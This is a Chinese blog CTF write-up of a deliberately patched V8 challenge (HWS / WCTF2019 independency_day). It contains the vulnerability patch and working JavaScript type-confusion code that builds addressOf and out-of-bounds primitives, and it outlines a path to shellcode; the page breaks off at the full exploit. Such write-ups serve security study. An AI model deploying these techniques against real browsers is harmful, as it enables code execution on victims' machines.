@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解前言华为XCTF比赛时P4nda学长说这个题完全用了WCTF2019-independency day的题目，原题是在win7-32bit下的，这道题刚好是linux下的，这里记录一下解题的过程。其中WCTF的题目比较难找，地址在这里 环境搭建为了能在release版本下调试，稍微修改下args.gn 123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解">
+<meta property="og:url" content="http://ama2in9.top/2021/07/06/hws-v8/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解前言华为XCTF比赛时P4nda学长说这个题完全用了WCTF2019-independency day的题目，原题是在win7-32bit下的，这道题刚好是linux下的，这里记录一下解题的过程。其中WCTF的题目比较难找，地址在这里 环境搭建为了能在release版本下调试，稍微修改下args.gn 123">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ama2in9.top/2021/07/06/hws-v8/1.gif">
+<meta property="og:updated_time" content="2021-07-06T09:24:17.097Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解">
+<meta name="twitter:description" content="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解前言华为XCTF比赛时P4nda学长说这个题完全用了WCTF2019-independency day的题目，原题是在win7-32bit下的，这道题刚好是linux下的，这里记录一下解题的过程。其中WCTF的题目比较难找，地址在这里 环境搭建为了能在release版本下调试，稍微修改下args.gn 123">
+<meta name="twitter:image" content="http://ama2in9.top/2021/07/06/hws-v8/1.gif">
+
+
+
+
+
+
+  <link rel="canonical" href="http://ama2in9.top/2021/07/06/hws-v8/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解 | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2021/07/06/hws-v8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-07-06 17:18:37 / Modified: 17:24:17" itemprop="dateCreated datePublished" datetime="2021-07-06T17:18:37+08:00">2021-07-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/07/06/hws-v8/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/07/06/hws-v8/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/07/06/hws-v8/" class="leancloud_visitors" data-flag-title="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="华为XCTF专场-HWS-v8-暨-WCTF2019-independency-day题解"><a href="#华为XCTF专场-HWS-v8-暨-WCTF2019-independency-day题解" class="headerlink" title="华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解"></a>华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>华为XCTF比赛时<code>P4nda</code>学长说这个题完全用了<code>WCTF2019-independency day</code>的题目，原题是在<code>win7-32bit</code>下的，这道题刚好是<code>linux</code>下的，这里记录一下解题的过程。其中<code>WCTF</code>的题目比较难找，地址在<a href="https://drive.google.com/drive/folders/1xijouA9fj1YUrY97wyoEQCZ5Q3tRWNOq" target="_blank" rel="noopener">这里</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>为了能在<code>release</code>版本下调试，稍微修改下<code>args.gn</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">is_debug = false</span><br><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br><span class="line">symbol_level=2</span><br><span class="line">target_cpu = &quot;x64&quot;</span><br><span class="line">v8_untrusted_code_mitigations = false</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 51a443ce</span><br><span class="line">gclient sync</span><br><span class="line">git apply diff.patch</span><br><span class="line">ools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>patch</code>如下，直接把<code>InstallDependency</code>给注释了，查看下相对引用，发现这个函数是所有<code>*Dependency</code>类的成员函数<code>Install</code>的核心。比如下面的<code>TransitionDependency</code>，用来绑定<code>map transition</code>过程中的依赖，每个依赖都会对应增加<code>weak code</code>用来监督对象类型，以确定是否要进行<code>解优化</code>。在之前的分析中我们介绍过<code>v8</code>使用两种解优化的方式：<code>eager deoptimization/lazy deoptimization</code>，前者对应<code>CheckMaps</code>节点，后者对应<code>code dependency</code>机制。其中对于<code>stable map</code>我们使用<code>code dependency</code>，所谓的<code>stable map</code>即<code>map</code>的<code>transition</code>链中最后一环，我们在<code>gdb</code>调试时使用<code>DebugPrint</code>时可以看到<code>Map</code>信息中会标记出<code>stable map</code>。</p>
+<p>在<code>WCTF</code>的分享中使用<code>double array-&gt;dictionary</code>触发。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransitionDependency</span> <span class="title">final</span> :</span> <span class="keyword">public</span> CompilationDependency &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">TransitionDependency</span><span class="params">(<span class="keyword">const</span> MapRef&amp; <span class="built_in">map</span>)</span> : <span class="title">map_</span><span class="params">(<span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">    DCHECK(!map_.is_deprecated());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">IsValid</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> !map_.object()-&gt;is_deprecated(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Install</span><span class="params">(<span class="keyword">const</span> MaybeObjectHandle&amp; code)</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    SLOW_DCHECK(IsValid());</span><br><span class="line">    DependentCode::InstallDependency(map_.isolate(), code, map_.object(),</span><br><span class="line">                                     DependentCode::kTransitionGroup);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  MapRef map_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index 1004180669..b032e456b9 100644</span><br><span class="line"><span class="comment">--- a/src/objects/code.cc</span></span><br><span class="line"><span class="comment">+++ b/src/objects/code.cc</span></span><br><span class="line">@@ -943,18 +943,6 @@ void DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">                                       const MaybeObjectHandle&amp; code,</span><br><span class="line">                                       Handle&lt;HeapObject&gt; object,</span><br><span class="line">                                       DependencyGroup group) &#123;</span><br><span class="line"><span class="deletion">-  if (V8_UNLIKELY(FLAG_trace_code_dependencies)) &#123;</span></span><br><span class="line"><span class="deletion">-    StdoutStream&#123;&#125; &lt;&lt; "Installing dependency of [" &lt;&lt; code-&gt;GetHeapObject()</span></span><br><span class="line"><span class="deletion">-                   &lt;&lt; "] on [" &lt;&lt; object &lt;&lt; "] in group ["</span></span><br><span class="line"><span class="deletion">-                   &lt;&lt; DependencyGroupName(group) &lt;&lt; "]\n";</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  Handle&lt;DependentCode&gt; old_deps(DependentCode::GetDependentCode(object),</span></span><br><span class="line"><span class="deletion">-                                 isolate);</span></span><br><span class="line"><span class="deletion">-  Handle&lt;DependentCode&gt; new_deps =</span></span><br><span class="line"><span class="deletion">-      InsertWeakCode(isolate, old_deps, group, code);</span></span><br><span class="line"><span class="deletion">-  // Update the list head if necessary.</span></span><br><span class="line"><span class="deletion">-  if (!new_deps.is_identical_to(old_deps))</span></span><br><span class="line"><span class="deletion">-    DependentCode::SetDependentCode(object, new_deps);</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure>
+<p>因为这里将安装<code>dependency</code>的函数注释掉了，我们的优化函数中不再有检查参数类型的操作，当我们修改掉对象类型再传参进入优化函数后，函数仍会按照之前的<code>map</code>类型解析和操作对象，可以借此构造出<code>类型混淆</code>。下面是最简单的一种类型混淆的方式，我们在优化完成后修改<code>arr[2]</code>的类型为<code>obj</code>，即可构造出<code>addressOf</code>原语，因为<code>压缩指针</code>的缘故，我们再在其后面布置<code>oob_arr</code>，即可以同样方式越界写其<code>length</code>字段得到<code>OOB</code>数组。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//addressOf</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res = arr[idx];</span><br><span class="line">  <span class="comment">//callback();</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">2</span>] = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//4.6038898435321547e-269</span></span><br></pre></td></tr></table></figure>
+<p>这里发现指针压缩后在其后布置<code>oob_arr</code>仍不能越界访问到，联想到之前<code>CVE-2020-6418</code>的对象空间布局，我们布置一些<code>hole</code>在数组之前，最后成功越界读和写得到了<code>oob_arr</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>,<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>,<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>,];</span><br><span class="line">arr.x = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line"><span class="keyword">var</span> oob_arr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gc();  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res = arr[idx];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo1</span>(<span class="params">idx, val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  arr[idx] = val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// %PrepareFunctionForOptimization(foo);</span></span><br><span class="line"><span class="comment">// foo(0);</span></span><br><span class="line"><span class="comment">// %OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">  foo1(<span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line"><span class="comment">// oob_arr = [13.37];</span></span><br><span class="line"><span class="comment">//gc();</span></span><br><span class="line">arr[<span class="number">1</span>] = &#123;&#125;;</span><br><span class="line"><span class="comment">//gc();</span></span><br><span class="line">oob_arr = [<span class="number">13.37</span>];</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line"><span class="keyword">var</span> res = f2i(foo(<span class="number">92</span>)) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="built_in">console</span>.log(hex(res));</span><br><span class="line"><span class="keyword">var</span> evil = <span class="number">0x3fc0n</span> * <span class="number">0x100000000n</span> + res;</span><br><span class="line">foo1(<span class="number">92</span>,i2f(evil));</span><br><span class="line">%DebugPrint(arr);</span><br><span class="line">%DebugPrint(oob_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DebugPrint: 0xa3d080c45d9: [JSArray]</span></span><br><span class="line"><span class="comment"> - map: 0x0a3d082438fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x0a3d0820b615 &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x0a3d080c45f1 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 8160</span></span><br><span class="line"><span class="comment"> - properties: 0x0a3d08042229 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - All own properties (excluding elements): &#123;</span></span><br><span class="line"><span class="comment">    0xa3d080446c1: [String] in ReadOnlySpace: #length: 0x0a3d08182159 &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x0a3d080c45f1 &lt;FixedDoubleArray[1]&gt; &#123;</span></span><br><span class="line"><span class="comment">           0: 13.37</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在下面的<code>exp</code>中我使用的是<code>WCTF</code>的方式，通过构造<code>double array-&gt;dictionary</code>的map转换实现了越界读写(一旦转换为字典模式后，中间的空间都是free spce，而对于优化函数来说依然是按照索引访存和取值)。之后依然是通过<code>obj_arr</code>实现<code>addressOf</code>原语，通过<code>BigUint64Array</code>实现任意地址读写，最后<code>wasm</code>执行shellcode。</p>
+<p><img src="/2021/07/06/hws-v8/1.gif" alt></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 